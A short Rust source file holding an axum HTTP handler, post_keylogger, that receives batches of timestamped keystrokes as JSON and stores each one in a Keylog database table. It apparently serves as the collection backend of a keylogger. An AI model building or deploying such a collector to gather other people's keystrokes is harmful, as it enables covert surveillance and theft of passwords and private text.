use axum::{Json, extract::State};
use chrono::NaiveDateTime;
use uuid::Uuid;

use crate::{AppState, Error};

#[derive(serde::Deserialize)]
pub struct Req {
    pub keys: Vec<Key>,
}

#[derive(serde::Deserialize)]
pub struct Key {
    pub at: NaiveDateTime,
    pub key_pressed: String,
}

#[axum::debug_handler]
pub async fn post_keylogger(
    State(app_state): State<AppState>,
    Json(req): Json<Req>,
) -> Result<(), Error> {
    for key in &req.keys {
        let keylog_id = Uuid::new_v4();
        sqlx::query!(
            r#"
                INSERT INTO Keylog
                    (keylog_id, key, created_at)
                    VALUES ($1, $2, $3)
                ;
            "#,
            keylog_id,
            &key.key_pressed,
            &key.at,
        )
        .execute(&app_state.db_pool)
        .await?;
    }

    Ok(())
}
